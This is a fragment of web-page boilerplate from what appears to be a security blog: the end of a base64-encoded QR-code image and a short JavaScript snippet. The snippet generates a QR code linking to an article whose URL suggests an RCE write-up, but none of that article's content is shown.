KvA5Y9AMYWPMpfb8hyTJ9xsfkMcVvAfcpyEUbdaYvmOofUQfAs131IHQT1jxCSne2l10LyXe981g+O662Dee56Q/ppv5lPB+I0Z+i+IdOGfTRnH7kIY13PQXzz3ZcX9kxptdQhvUqrBSOf5bouF6vXep3p+ns4Hche+NL++xNYfsqa3QryFMGIPe8Tot551yH9eg6i97y8IyQPLBYwfP5BeL9X50uDrwtIHQS/5CnAfg5G3fvu4fWGTI/3PcYyEMgUnRqMXF2E+G4bwrsvNyee6TMfch8I2q8QolkL4eXVgnAIlrZe1p2hNZA+ELROX+w6JA9bXAZi8YXvPYHp7yF9WzBO06l3hOTUIbz3k8Nzvv2sE9XX2L3OzULuDUFzcMzN2UcOx3UQv9dZX3i9IXUKH7Q2A4FxijDy2XRhzMHI/Z4hOgTVRYgOQfWO7gOSgy1aM8vqi5Ae5tU7QnJdn9VB8t2Xr3EzkH6Ti//sCTw9EMiUITjbJow+jNw6n4rO1TvCcZ913p4ipNaMuth1SB6C5mbY682pizD2g3B44NMD8SYX/rcnsPlN3WnObqsPj6kCS1y/I7D727OFMPrqYu+nDqmDB5qFaDPedXuK+iKM/cxBdLl5uTjT9QuvN6RO4YPW6e8hfaqw/zSYg/gwor7fu7yjvghjn673+uJmOpZXSx3SW36GVVsLxrrSalkP8WFEfbFqaskLrzekTuGD1mYgsD/VmuR6+T1A8vJ1pq7VX0UY+/b66l1rrcN+DYw6jNwe1a+W/LtYvWr1PrB//8ptBlLitd53ApufstxKTbaWXIRxupWppd+xvFqQurquBeGwj5XZW7CfB5ZbA8NPdBoQvffV7wjJw4jWm4fR77pc7PXqhdcbUqfwQWv5KcupibM96oswPh2wz3s/67veOaRf163fw7OsPqS3PdRF9Y76HXtO3nNH/HpDjk7nDd7yGQJ5WuA5dK/9KZDPEMb+sz6QnH0g3LwI0QGlBXstcP9sgeASnFxAchA0BuEQVBdhX+8+bHPXG+IpfQguA/FpOsOzfUOmDsGen/U31331Ga7zPQPZwzpT1z3XeWXWSx/STz5Da2f+kb4M5Ch0eT93ApuBQJ4CGPFsSz4VHWHsA+H2g5Gf6d2H1MMDzbgXiKf+t9D+9oPcB0bsvnV7uBmIxRe+5wS+PRB47Wno36ZPSdflkP7mRP01Hnnr3Owacq/u27ejua7L9UV1OWzv9+2B2PzCv3MC3x5In7rb6jrkaVCHcPMi7Ov6on3WCKlVMytCfLk5iN65OYgPQfWOEB+C9uu5ziF54Pqfz9w+7GvzhjjVjs/uGx7TBqZl9gfuvz0bVJe/gtbCfk99e0Jy6jByc6I5eUd9sfuQ/urm1rgZiOEL33MCy0Ag04NjPNum0+45dUh/fXU5xO+6fkdIHujW/c0DFjTQe0My+hAOwa7LRRhzM312X0g9cH2G3D7sa3lDPmxf/9vt/AsAAP//xZSU9wAAAAZJREFUAwAxGqq5CRGNRwAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 